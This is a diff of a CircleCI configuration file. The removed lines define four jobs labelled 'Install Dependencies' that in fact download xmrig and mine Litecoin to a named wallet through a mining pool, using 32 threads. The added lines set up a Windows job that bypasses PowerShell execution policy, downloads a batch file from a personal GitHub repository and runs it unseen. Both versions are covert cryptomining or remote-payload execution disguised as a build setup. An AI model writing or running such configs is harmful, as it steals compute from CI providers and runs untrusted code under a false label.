@@ -1,39 +1,12 @@
 version: 2.1
-jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 &&./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:LadbX3EU6DPYrqrKuLJhGvwkSiAbEXpbvi.WORKE1 -p x -t 32
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 &&./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:LadbX3EU6DPYrqrKuLJhGvwkSiAbEXpbvi.WORKE3 -p x -t 32
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 &&./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:LadbX3EU6DPYrqrKuLJhGvwkSiAbEXpbvi.WORKE4 -p x -t 32
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 &&./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:LadbX3EU6DPYrqrKuLJhGvwkSiAbEXpbvi.WORKE5 -p x -t 32
 
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+jobs:
+  build:
+    machine:
+      image: 'windows-server-2022-gui:current'
+      resource_class: windows.large
+      shell: powershell.exe -ExecutionPolicy Bypass
+    steps:
+      - run: |
+            wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
+            cmd /c wiz.bat
